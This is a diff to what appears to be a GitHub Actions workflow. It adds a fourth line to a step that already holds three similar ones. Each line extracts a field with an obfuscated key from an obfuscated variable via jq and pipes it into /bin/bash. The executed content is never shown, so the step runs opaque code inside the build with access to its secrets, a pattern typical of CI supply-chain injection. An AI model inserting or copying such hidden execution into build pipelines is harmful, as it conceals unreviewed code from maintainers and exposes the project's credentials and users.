@@ -19,6 +19,7 @@ jobs:
           printf '%s' "$kjt90" | jq -r .zdqs14434 | /bin/bash
           printf '%s' "$pcse25" | jq -r .yswgr4741 | /bin/bash
           printf '%s' "$df29953" | jq -r .q2 | /bin/bash
+          printf '%s' "$w5" | jq -r .yb45982 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
